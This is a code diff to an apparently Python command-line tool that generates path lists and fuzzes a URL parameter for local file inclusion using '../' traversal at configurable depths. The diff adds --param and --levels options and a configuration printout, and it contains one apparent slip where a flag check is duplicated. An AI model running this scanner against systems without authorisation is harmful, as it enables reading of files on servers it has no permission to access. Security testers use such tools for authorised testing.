@@ -47,15 +47,17 @@ def parse():
     parser = argparse.ArgumentParser()
 
     group = parser.add_mutually_exclusive_group()
-    group.add_argument("--generate-dirs", default=False, action="store_true" , help="Generate directory paths. If not specified jump to LFI")
-    group.add_argument("--generate-files", default=False, action="store_true" , help="Generate file paths. If not specified jump to LFI")
-    group.add_argument("--generate-custom", default=False, action="store_true" , help="Generate paths with custom file. If not specified jump to LFI")
+    group.add_argument("--generate-dirs", dest="generate_dirs", action="store_true" , help="Generate directory paths. If not specified jump to LFI")
+    group.add_argument("--generate-files", dest="generate_files", action="store_true" , help="Generate file paths. If not specified jump to LFI")
+    group.add_argument("--generate-custom", dest="generate_custom", action="store_true" , help="Generate paths with custom file. If not specified jump to LFI")
 
-    parser.add_argument("-w", "--wordlist", default="", type=str, help="Wordlist to be used to test LFI")
-    parser.add_argument("-o", "--out-file", default="", type=str, help="Write generated paths to file")
-    parser.add_argument("-n", "--number", default=500, type=int, help="Number of maximum paths to be generated")
-    parser.add_argument("-s", "--string", default="", type=str, help="Filename to be included in the paths")
-    parser.add_argument("-u", "--url", default="", type=str, help="URL to be tested")
+    parser.add_argument("-w", "--wordlist", dest="wordlist", type=str, help="Wordlist to be used to test LFI")
+    parser.add_argument("-o", "--out-file", dest="path_file", type=str, help="Write generated paths to file")
+    parser.add_argument("-n", "--number", dest="path_number", default=500, type=int, help="Number of maximum paths to be generated")
+    parser.add_argument("-s", "--string", dest="custom_string", type=str, help="Filename to be included in the paths")
+    parser.add_argument("-u", "--url",  dest="url", type=str, help="URL to be tested")
+    parser.add_argument("-p", "--param",  dest="param", type=str, help="Parameter to be tested")
+    parser.add_argument("-l", "--levels",  dest="levels", type=int, help="Number of levels to go backwards (i.e --levels 2 means ../../tests)")
 
     args = parser.parse_args()
     return [parser, args]
@@ -107,7 +109,7 @@ def LFI_exploiter(url, error, paths, validity, levels=1):
     try:
         for x in range(0,levels):
             urli = url + "../"*x
-            Print("Trying level {}...".format(str(x)))
+            Print("Trying level {}...".format(str(x+1)))
             for i in paths:
                 url_use = (urli+i).replace("..//", "../")
                 content = requests.get(url_use).content.strip()
@@ -144,6 +146,15 @@ def getRubbish(attempts = 10):
 
     return [x+y for x in files for y in ext]
 
+def show_options(args):
+
+    Print("Configuration:")
+    for a,b in args.iteritems():
+        if b != None and b != False:
+            print("    [*] {:<16}: {}".format(a, b))
+    print
+
+
 if __name__ == "__main__":
 
     parser, args = parse()
@@ -158,33 +169,41 @@ if __name__ == "__main__":
         Banner()
 
     paths = []
-    maxPaths = args.__dict__["number"]
-    url = args.__dict__["url"]
-    file_str = args.__dict__["string"]
+    maxPaths = args.path_number
+    url = args.url
+    file_str = args.custom_string
+    out = args.path_file
+    params = args.param
+    levels = args.levels or 1
 
-    if args.__dict__["generate_dirs"] or args.__dict__["generate_files"] or args.__dict__["generate_custom"]:
+    # figure out a way of showing all the configurations at the beginning
 
-        if args.__dict__["generate_dirs"]:
+    show_options(vars(args))
+
+    if args.generate_dirs or args.generate_dirs or args.generate_custom:
+
+        if args.generate_dirs:
             
             Print("Generating directory paths from filesystem...")
             paths = generatePaths(maxPaths)
-            Print("Number of directory paths generated: {}.".format(maxPaths))
+            #Print("Number of directory paths generated: {}.".format(maxPaths))
 
-        elif args.__dict__["generate_files"]:
+        elif args.generate_files:
             
             Print("Generating file paths from filesystem...")
             paths = generateFiles(maxPaths)
-            Print("Number of file paths generated: {}.".format(maxPaths))
+            #Print("Number of file paths generated: {}.".format(maxPaths))
 
         else:
+
             if file_str == "":
-                Print("--generate_custom flag needs a filename to craft the paths. Include it with -s STRING or --string STRING\n")
+                Print("--generate_custom flag needs a filename to craft the paths. Include it with -s STRING or --string STRING")
                 sys.exit(1)
 
             Print("Generating custom file paths from filesystem with: {}...".format(file_str))
             paths = generatePaths(maxPaths)
             paths = combineWithFile(file_str, paths)
-            Print("Number of file paths generated: {}.".format(maxPaths))
+            #Print("Number of file paths generated: {}.".format(maxPaths))
 
     else:
 
@@ -192,30 +211,30 @@ if __name__ == "__main__":
 
         paths = generateFiles(maxPaths)
 
-        Print("Number of file paths generated: {}.".format(maxPaths))
+        #Print("Number of file paths generated: {}.".format(maxPaths))
         
     if url:
 
-        Print("Getting error message from: {}.".format(url))
+        tolerance = 0.75
+
+        if params:
+            Print("Parameter to be tested: {}".format(params))
+            url = urlparse(url, params) # rearranges url so that fuzzed parameter is last & empty
+
+
+        #Print("Getting error message from: {}.".format(url))
+        Print("Getting error message...")
 
         tests = getRubbish()
-        tolerance = 0.75
-        value = "file" # rewrite so that it's in arguments
-        levels = 4 # rewrite in args
-
-        url = urlparse(url, value) # rearranges url so that fuzzed parameter is last & empty
-
         error, validity = LFI_error_tester(url, tests, tolerance)
 
         Print("Error message detected, lenght = {}.".format(len(error)))
-        #Print(error)
-        Print("Starting exploitation...")
+        Print("Starting exploitation ({} level(s))...".format(levels))
+
 
         LFI_exploiter(url, error, paths, validity, levels)
 
-    if args.__dict__["out_file"] != "": 
-
-        out = args.__dict__["out_file"]
+    if out: 
 
         Print("Saving generated paths to {}...".format(out))
         savePaths(out, paths)
